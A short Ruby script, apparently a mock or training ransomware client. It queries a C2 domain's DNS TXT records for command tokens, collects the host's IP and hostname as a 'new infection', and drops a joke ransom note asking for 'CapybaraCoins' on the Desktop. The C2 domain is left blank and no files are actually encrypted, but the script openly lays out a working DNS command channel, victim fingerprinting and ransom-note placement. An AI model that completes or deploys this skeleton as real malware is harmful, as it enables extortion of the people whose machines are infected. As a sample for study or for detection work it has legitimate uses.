#!/usr/bin/ruby
require 'socket'
require 'dnsruby'
include Dnsruby

#Define C2 Server (Domain)
$c2_server = ""

puts "[*] Querying #{$c2_server} for commands..."
res = Dnsruby::Resolver.new
ret = res.query($c2_server, Types.TXT)
commands = []
ret.answer.each do |x|
    if x.rdata.to_s.include? "__SEQ_START"
        commands[0] = x.rdata.to_s
    elsif x.rdata.to_s.include? "__SET_KEY"
        commands[1] = x.rdata.to_s
    elsif x.rdata.to_s.include? "__LEAK_INFO"
        commands[2] = x.rdata.to_s
    elsif x.rdata.to_s.include? "__CRYPT_START"
        commands[3] = x.rdata.to_s
    elsif x.rdata.to_s.include? "__SEQ_END"
        commands[4] = x.rdata.to_s
    end
end

commands.each do |com|
    if com.include? "__SEQ_START"
        puts "[*] Received SEQ_START."
    end

    if com.include? "__SET_KEY"
        puts "[*] Negotiated Key."
    end

    if com.include? "__LEAK_INFO"
        puts "[*] Leaking data..."
        my_ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
        my_hostname = Socket.gethostname
        puts "[*] New infection: #{my_hostname} (#{my_ip})."
    end

    if com.include? "__CRYPT_START"
        puts "[*] Starting encryption cycle..."
        begin
            desktop = ""
            if Dir.exist?(File.expand_path('~') + "/Desktop")
                desktop = "#{File.expand_path('~')}/Desktop"
            elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
                desktop = "#{File.expand_path('~')}/Escritorio"
            else
                desktop = "/tmp"
            end
            File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
            ""
        rescue => e
            puts "Exception: #{e}"
            "Error: Failed to run supplied command."
        end
    end

    if com.include? "__SEQ_END"
        puts "[*] Received SEQ_END."
    end
end